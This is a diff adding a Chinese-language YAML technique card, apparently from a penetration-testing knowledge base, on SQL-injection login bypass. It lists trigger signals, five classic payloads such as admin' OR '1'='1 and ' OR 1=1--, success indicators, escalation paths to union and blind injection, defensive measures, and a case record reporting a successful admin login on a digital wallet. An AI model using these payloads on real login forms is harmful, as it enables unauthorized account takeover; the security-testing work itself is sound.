@@ -1,0 +1,63 @@
+# 技术卡片: SQLi - 万能密码 (Authentication Bypass)
+# 分类: sqli / auth-bypass
+# 版本: 1.0
+# 日期: 2026-07-20
+
+id: "sqli-auth-bypass-or"
+name: "万能密码 SQLi 认证绕过"
+category: "sqli"
+subcategory: "auth-bypass"
+severity: "critical"
+
+description: |
+  在登录表单的 username 字段注入 OR 条件，绕过密码验证。
+  适用于后端使用字符串拼接构建 SQL 查询的场景。
+
+trigger_signals:
+  - "POST /api/login 或 /login 端点"
+  - "Content-Type: application/json 登录"
+  - "错误响应包含 '用户名或密码错误'"
+  - "无验证码/速率限制"
+
+payloads:
+  - username: "admin' OR '1'='1"
+    password: "x"
+    note: "通用万能密码"
+  - username: "admin' OR '1'='1--"
+    password: "x"
+    note: "带注释符 (MySQL/SQLite)"
+  - username: "admin'--"
+    password: "x"
+    note: "注释掉密码部分"
+  - username: "' OR 1=1--"
+    password: "x"
+    note: "无特定用户名"
+  - username: "admin' OR '1'='1' LIMIT 1--"
+    password: "x"
+    note: "限制返回行数"
+
+success_indicators:
+  - "响应返回 token/session"
+  - "响应包含 '登录成功'"
+  - "HTTP 200 + JSON user 对象"
+  - "响应不再包含 '错误'"
+
+prerequisites:
+  - "后端 SQL 拼接查询"
+  - "username 参数未参数化"
+  - "登录接口可访问"
+
+defense:
+  - "参数化查询 (PreparedStatement)"
+  - "登录接口加验证码和速率限制"
+  - "禁用详细错误回显"
+  - "最小权限数据库账户"
+
+upgrade_paths:
+  - "Union SQLi 提取数据"
+  - "Boolean-based Blind SQLi 逐字符提取"
+  - "Time-based Blind SQLi (如果布尔盲注不可靠)"
+
+sources:
+  - case: "20260720-digital-wallet-sqli-idor"
+    outcome: "admin 登录成功"
